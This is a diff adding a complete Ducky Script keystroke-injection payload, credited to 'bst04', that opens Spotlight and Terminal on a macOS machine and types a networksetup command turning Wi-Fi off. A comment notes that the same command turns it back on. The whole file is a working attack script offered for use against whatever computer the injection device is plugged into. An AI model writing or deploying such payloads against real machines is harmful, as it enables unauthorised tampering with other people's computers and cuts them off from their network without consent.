@@ -1,0 +1,16 @@
+REM =================================
+REM payload made by bst04
+REM This payload turn off the wifi 
+REM To turn on change off for on
+REM =================================
+
+DELAY 1000
+GUI SPACE
+DELAY 250
+STRING TERMINAL
+DELAY 250
+ENTER
+DELAY 250
+STRING networksetup -setnetworkserviceenabled Wi-Fi off
+DELAY 500
+ENTER
